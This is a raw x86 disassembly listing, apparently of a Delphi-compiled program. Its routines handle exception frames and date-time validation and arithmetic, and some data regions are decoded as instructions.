pop ecx
mov [ fs : eax ] edx
push sub_468118
retn
mov eax rw-data
call sub_40f188
sub_46811c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468164
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46816b
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419a24
mov eax rw-data
mov edx [ rw-data ]
call sub_40f49c
sub_468170
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468195
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46819c
retn
sub_4681a8
push ebx
push esi
mov ebx edx
mov esi eax
cmp bx 0x2
jne r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_409900
test al al
jne r-xdata
and eax 0x7f
lea eax [ eax + eax * 2 ]
mov edx [ rw-data ]
lea eax [ edx + eax * 8 ]
movzx edx bx
mov ax [ eax + edx * 2 - 0x2 ]
pop esi
pop ebx
retn
mov al 0x1
sub_4681e0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_468205
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46820c
retn
sub_468218
push 0xe4004776
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add ch ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add dh ah
inc [ eax ]
add [ eax + 0x76 ] ch
inc edi
add bh ah
inc [ eax ]
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_46825d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468264
retn
sub_468274
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ ebx + 0x140046 ] al
add [ eax ] al
pushad
pop esp
inc ecx
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
cmpsd [ esi ] [ edi ]
popad
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x410a0000 ] al
jae r-xdata
popad
je r-xdata
insd
push ebx
je r-xdata
popad
outsb
je r-xdata
add eax [ ecx + 0x79 ]
xchg esp eax
popad
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] eax
or [ ecx + 0x73 ] al
push ebx
mov eax eax
push eax
mov [ esi ] al
add [ eax ] eax
jo r-xdata
insd
inc ecx
add [ eax + ebp * 4 ] ch
inc ecx
add [ eax - 0x59 ] al
inc ecx
add [ ecx ] dl
push esp
push ebx
push ecx
dec esp
push esp
imul ebp [ ebp + 0x65 ] 0x6d617453
jns r-xdata
dec ebp
outsd
outsb
je r-xdata
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] 0x40108073
add [ edx ] cl
add [ eax ] al
push esp
imul ebp [ ebp + 0x65 ] r-xdata
and [ eax - 0x77afffba ] cl
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x694d0600
outsb
jne r-xdata
imul ebp [ esi + 0x67 ] r-xdata
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x41080001 ] al
jae r-xdata
add [ eax - 0x78 ] dl
popad
je r-xdata
pushfd
add [ esi ] 0x7
adc [ ebx + edx * 2 + 0x51 ] edx
lea eax [ eax ]
js r-xdata
add [ ebp + 0x6 ] dh
adc [ eax ] 0x40
add [ esi ] cl
add [ eax ] al
inc [ edx + ecx * 4 ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53060007 ] al
arpl [ gs : edi + 0x6e ] bp
cmp al 0x10
inc eax
add [ eax + eax ] al
add bh bh
or al 0x8a
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x59040008 ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
or al [ eax ]
add bh bh
in al dx
mov [ esi ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al 0x0
add al 0x48
outsd
jne r-xdata
je r-xdata
add [ ebp + 0x1b ] dh
adc [ gs : eax ] 0x40
dec esp
push esp
imul ebp [ ebp + 0x65 ] 0x6d617453
jo r-xdata
push ebx
push ecx
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x44030002 ] al
popad
or [ eax ] al
add bh bh
loopne r-xdata
js r-xdata
inc eax
add [ eax + edx * 2 + 0x41 ] dh
add al cl
push ecx
inc ecx
add [ ecx + edx * 2 ] al
inc ecx
add [ eax ] bh
push ecx
inc ecx
add [ eax ] bl
push ecx
inc ecx
add [ edx * 2 + 0x51000041 ] ah
inc ecx
add [ edx + ecx * 4 ] ah
inc esi
add [ eax - 0x75 ] dl
inc esi
add [ ebp + ecx * 2 + 0x41 ] ch
add [ edx + ecx * 4 ] dl
inc esi
add [ eax - 0x74 ] bh
inc esi
add al cl
mov [ esi ] es
dec esp
push ecx
inc ecx
add [ ecx * 2 - 0x7303ffbf ] dh
inc esi
add [ eax ] dl
push edx
inc ecx
add al ch
push edi
inc ecx
add ah dh
push edi
inc ecx
add [ esp ] cl
inc ecx
add [ esp + 0x41 ] bh
add ah al
mov [ esi ] es
sbb [ ebx + edx * 2 + 0x51 ] dl
dec esp
push esp
imul ebp [ ebp + 0x65 ] 0x6d617453
jo r-xdata
xor [ eax ] eax
shl [ ecx ] 0x1
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx + 0x140046 ] al
mov al 0x1
retn
xor eax eax
retn
add [ esi ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d060005 ] al
imul ebp [ esi + 0x75 ] 0x10806574
inc eax
shl [ esi - 0x7d ] 0x38
add [ ebp + 0x29 ] dh
cmp [ eax + 0x2 ] 0x0
jne r-xdata
popad
jb r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
or [ eax ] al
add al 0x59
adc [ eax ] 0x40
add [ eax + eax ] cl
add bh bh
hlt
cmp [ eax + 0x8 ] 0x0
jne r-xdata
insd
push ebx
je r-xdata
adc [ eax ] al
adc [ eax ] al
add bh bh
call 0x146cac0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46090003 ] al
jb r-xdata
add [ eax ] al
inc esp
jg r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
add [ esi ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + eax * 4 + 0x140046 ] al
inc esi
add [ eax + 0x900417f ] bh
add [ eax ] cl
push ebx
jno r-xdata
inc ecx
add [ eax + ebp * 4 ] ah
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edi ] dl
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0xa ] 0x0
jne r-xdata
je r-xdata
add [ edx + edx - 0x77c7ffc0 ] dh
inc esi
add [ eax + ecx * 4 + 0x46 ] dh
jns r-xdata
push esp
imul ebp [ ebp + 0x53 ] 0xb4000974
adc al [ eax ]
cmp [ eax - 0x778bffba ] cl
cmp [ eax + 0x6 ] 0x0
jne r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
inc ecx
inc esi
sub_468496
cld
mov [ esi ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push es
add [ 0x746e6f4d ] al
push r-xdata
push cs
add [ eax ] al
inc [ edx + ecx * 4 ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53060007 ] al
arpl [ gs : edi + 0x6e ] bp
cmp al 0x10
inc eax
add [ eax + eax ] al
add bh bh
or al 0x8a
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x59040008 ] al
popad
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4d060005 ] al
imul ebp [ esi + 0x75 ] 0x10806574
inc eax
add [ esi ] al
add [ eax ] al
shl [ esi - 0x7d ] 0x38
add [ ebp + 0x29 ] dh
cmp [ eax + 0x2 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0x6 ] 0x0
jne r-xdata
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0xa ] 0x0
jne r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_4684f0
cmp [ eax ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x2 ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
cmp [ eax + 0x6 ] 0x0
jne r-xdata
cmp [ eax + 0x8 ] 0x0
jne r-xdata
cmp [ eax + 0xa ] 0x0
jne r-xdata
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_468534
push ebx
jmp r-xdata
mov cx [ eax + 0x6 ]
cmp cx 0x1
jb r-xdata
xor ecx ecx
mov cl dl
mov bx [ ecx * 4 + rw-data ]
add [ eax + 0x4 ] bx
mov cx [ ecx * 4 + rw-data ]
add [ eax + 0x6 ] cx
cmp cx 0xc
ja r-xdata
pop ebx
retn
sub_468568
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_4686f4
jmp r-xdata
mov dx [ esi + 0x8 ]
cmp dx 0x1
jb r-xdata
xor edx edx
mov dl bl
mov dx [ edx * 4 + rw-data ]
add [ esi + 0x6 ] dx
test bl bl
je r-xdata
movzx edx dx
cmp eax edx
jl r-xdata
add [ esi + 0x8 ] ax
sub [ esi + 0x8 ] ax
jmp r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_468534
mov eax esi
call sub_4686f4
sub_4685bc
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xa ]
cmp ax 0x17
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0x8 ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xa ] ax
mov edx ebx
mov eax esi
call sub_468568
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_468600
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xc ]
cmp ax 0x3b
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0xa ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xc ] ax
mov edx ebx
mov eax esi
call sub_4685bc
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_468644
push ebx
push esi
mov ebx edx
mov esi eax
jmp r-xdata
mov ax [ esi + 0xe ]
cmp ax 0x3b
ja r-xdata
xor eax eax
mov al bl
mov dx [ eax * 4 + rw-data ]
add [ esi + 0xc ] dx
mov ax [ eax * 4 + rw-data ]
add [ esi + 0xe ] ax
mov edx ebx
mov eax esi
call sub_468600
movzx eax ax
test eax eax
jl r-xdata
pop esi
pop ebx
retn
sub_468688
push ebx
push esi
mov ebx edx
mov esi eax
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_468534
mov edx ebx
mov eax esi
call sub_468568
mov edx ebx
mov eax esi
call sub_4685bc
mov edx ebx
mov eax esi
call sub_468600
mov edx ebx
mov eax esi
call sub_468644
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
call sub_468644
mov edx ebx
mov eax esi
call sub_468600
mov edx ebx
mov eax esi
call sub_4685bc
mov edx ebx
mov eax esi
call sub_468568
mov edx ebx
mov eax esi
call sub_468534
pop esi
pop ebx
retn
sub_46870c
mov cx [ edx + 0x4 ]
sub [ eax + 0x4 ] cx
mov cx [ edx + 0x6 ]
sub [ eax + 0xa ] cx
mov cx [ edx + 0x8 ]
sub [ eax + 0x8 ] cx
mov cx [ edx + 0xa ]
sub [ eax + 0xa ] cx
mov cx [ edx + 0xc ]
sub [ eax + 0xc ] cx
mov cx [ edx + 0xe ]
sub [ eax + 0xe ] cx
mov edx [ edx + 0x10 ]
sub [ eax + 0x10 ] edx
mov dl 0x1
call sub_468688
retn
sub_46874c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_468528
test al al
jne r-xdata
pop esi
pop ebx
retn
mov ax [ esi + 0x4 ]
add [ ebx + 0x4 ] ax
mov ax [ esi + 0x6 ]
add [ ebx + 0xa ] ax
mov ax [ esi + 0x8 ]
add [ ebx + 0x8 ] ax
mov ax [ esi + 0xa ]
add [ ebx + 0xa ] ax
mov ax [ esi + 0xc ]
add [ ebx + 0xc ] ax
mov ax [ esi + 0xe ]
add [ ebx + 0xe ] ax
mov eax [ esi + 0x10 ]
add [ ebx + 0x10 ] eax
xor edx edx
mov eax ebx
call sub_468688
sub_4687a0
push ebx
movsx ecx [ eax + 0x4 ]
movsx ebx [ edx + 0x4 ]
sub ecx ebx
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0x6 ]
movzx ebx [ edx + 0x6 ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0x8 ]
movzx ebx [ edx + 0x8 ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xa ]
movzx ebx [ edx + 0xa ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xa ]
movzx ebx [ edx + 0xa ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xc ]
movzx ebx [ edx + 0xc ]
sub ecx ebx
test ecx ecx
jne r-xdata
movzx ecx [ eax + 0xe ]
movzx ebx [ edx + 0xe ]
sub ecx ebx
test ecx ecx
jne r-xdata
mov ecx [ eax + 0x10 ]
sub ecx [ edx + 0x10 ]
test ecx ecx
jle r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
mov al 0x2
jmp r-xdata
pop ebx
retn
sub_468850
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax esi
call sub_468de4
mov esi esp
lea edi [ ebx + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_468874
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_468e50
lea esi [ ebp - 0x10 ]
lea edi [ ebx + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4688a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_4031ec
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
call sub_468e50
push esi
lea edi [ esi + 0x4 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4688fc
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_468de4
xor edx edx
mov eax edi
call sub_4031ec
push edi
add edi 0x4
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_468954
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov eax esi
call sub_468f20
xor edx edx
mov eax edi
call sub_4031ec
lea edx [ edi + 0x4 ]
mov eax esi
mov ecx 0x10
call sub_402988
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_4689a4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ ecx + 0x4 ]
mov ecx eax
xor edx edx
mov eax esi
call sub_468954
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_468a24
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
xor ebx ebx
mov [ ebp - 0x2c ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_468b44
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415154
xor eax eax
push ebp
push sub_468b27
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx ebx
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_415164
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4151f0
test al al
je r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_415154
xor eax eax
push ebp
push sub_468afa
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x7
lea ecx [ ebp - 0x18 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_415170
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4688a0
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
call sub_41515c
retn
lea ecx [ ebp - 0x2c ]
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_4151fc
mov ecx [ ebp - 0x2c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4688fc
mov edx [ ebp - 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ edx ] ax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468b2e
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_41515c
retn
sub_468b50
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
mov ebx ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_468c67
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
mov edx [ ebp - 0x4 ]
cmp ax [ edx + 0x4 ]
jne r-xdata
push esi
mov ecx ebx
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_414ce0
mov eax esi
sub ax 0x8
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ ebx + 0x8 ]
call sub_468820
mov edx [ ebp - 0x1c ]
lea eax [ ebp - 0x18 ]
call sub_4047c4
mov ecx [ ebp - 0x18 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4151a4
jmp r-xdata
sub ax 0xf8
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468c6e
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_403f90
lea eax [ ebp - 0x18 ]
call sub_404678
retn
lea edx [ ebp - 0x20 ]
mov eax [ ebx + 0x8 ]
call sub_468820
mov ecx [ ebp - 0x20 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415198
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_415154
xor eax eax
push ebp
push sub_468c30
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x14 ] 0x7
mov eax [ ebx + 0x8 ]
call sub_468838
fstp [ ebp - 0xc ]
fwait
push esi
lea ecx [ ebp - 0x14 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_415170
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_41515c
retn
sub_468c78
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov ax [ ebx + 0x4 ]
mov [ edi ] ax
mov ecx [ esi + 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_4689a4
mov [ edi + 0x8 ] eax
mov edx esi
mov eax ebx
call sub_415184
test al al
je r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_415164
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_468cc8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
sub ebx 0x1
jb r-xdata
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_46874c
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
mov eax [ edx + 0x8 ]
mov edx [ ecx + 0x8 ]
call sub_46870c
jmp r-xdata
jmp r-xdata
call sub_415128
sub_468cfc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx [ esi + 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_4687a0
mov edx [ ebp + 0x8 ]
mov [ edx ] al
pop esi
pop ebx
pop ebp
retn 0x4
sub_468d1c
push ebx
push esi
push edi
add esp 0xffffffe8
mov esi edx
lea edi [ esp + 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
mov ebx eax
lea eax [ esp + 0x8 ]
call sub_468e98
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
mov eax esi
mov edx ebx
call sub_40a754
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_468d58
push ebx
push esi
mov ebx eax
mov si [ ebx + 0x2 ]
cmp si 0xc
ja r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov ax [ ebx ]
call sub_4681a8
cmp ax [ ebx + 0x4 ]
jb r-xdata
cmp [ ebx + 0x6 ] 0x17
ja r-xdata
cmp [ ebx + 0x8 ] 0x3b
ja r-xdata
cmp [ ebx + 0xa ] 0x3b
jbe r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_468d98
push ebx
push esi
push edi
add esp 0xffffffe8
mov ebx edx
mov edx esp
call sub_40b024
test al al
je r-xdata
test al al
jne r-xdata
push [ esp + 0x4 ]
push [ esp + 0x4 ]
lea eax [ esp + 0x10 ]
call sub_468e50
lea esi [ esp + 0x8 ]
mov edi ebx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax ebx
call sub_468d58
add esp 0x18
pop edi
pop esi
pop ebx
retn
mov edi ebx
mov esi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub_468de4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_468e41
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov eax ebx
call sub_468d98
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468e48
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
sub_468e50
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea ecx [ ebx + 0x4 ]
lea edx [ ebx + 0x2 ]
lea eax [ ebp - 0x4 ]
call sub_409b80
mov ax [ ebp - 0x4 ]
mov [ ebx ] ax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
lea eax [ ebp - 0x2 ]
push eax
lea ecx [ ebx + 0xa ]
lea edx [ ebx + 0x8 ]
lea eax [ ebx + 0x6 ]
call sub_4098a4
movzx eax [ ebp - 0x2 ]
mov [ ebx + 0xc ] eax
pop ebx
pop ecx
pop ebp
retn 0x8
sub_468e98
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_4684f0
test al al
je r-xdata
mov cx [ ebx + 0x4 ]
mov dx [ ebx + 0x2 ]
mov ax [ ebx ]
call sub_409a04
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jb r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
jmp r-xdata
mov ax [ ebx + 0xc ]
push eax
mov cx [ ebx + 0xa ]
mov dx [ ebx + 0x8 ]
mov ax [ ebx + 0x6 ]
call sub_409864
fsubr [ esp ]
fstp [ esp ]
fwait
mov ax [ ebx + 0xc ]
push eax
mov cx [ ebx + 0xa ]
mov dx [ ebx + 0x8 ]
mov ax [ ebx + 0x6 ]
call sub_409864
fadd [ esp ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_468f20
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_46901c
push [ fs : eax ]
mov [ fs : eax ] esp
movsx eax [ ebx ]
movzx edx [ ebx + 0x2 ]
add eax edx
movzx edx [ ebx + 0x4 ]
add eax edx
mov edx eax
movzx ecx [ ebx + 0x6 ]
add edx ecx
movzx ecx [ ebx + 0x8 ]
add edx ecx
movzx ecx [ ebx + 0xa ]
add edx ecx
test edx edx
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469023
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
test eax eax
jle r-xdata
movzx eax [ ebx + 0x6 ]
movzx edx [ ebx + 0x8 ]
add eax edx
movzx edx [ ebx + 0xa ]
add eax edx
test eax eax
jbe r-xdata
mov si [ ebx ]
test si si
je r-xdata
cmp [ ebx + 0x6 ] 0x17
ja r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
cmp [ ebx + 0x2 ] 0x0
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
call sub_4039a8
cmp [ ebx + 0xa ] 0x3b
ja r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x3b
jbe r-xdata
cmp [ ebx + 0x2 ] 0x1f
ja r-xdata
mov dx [ ebx + 0x2 ]
mov eax esi
call sub_4681a8
cmp ax [ ebx + 0x4 ]
jae r-xdata
sub_46902c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46905d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469064
retn
mov eax rw-data
call sub_40d3ac
sub_469088
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
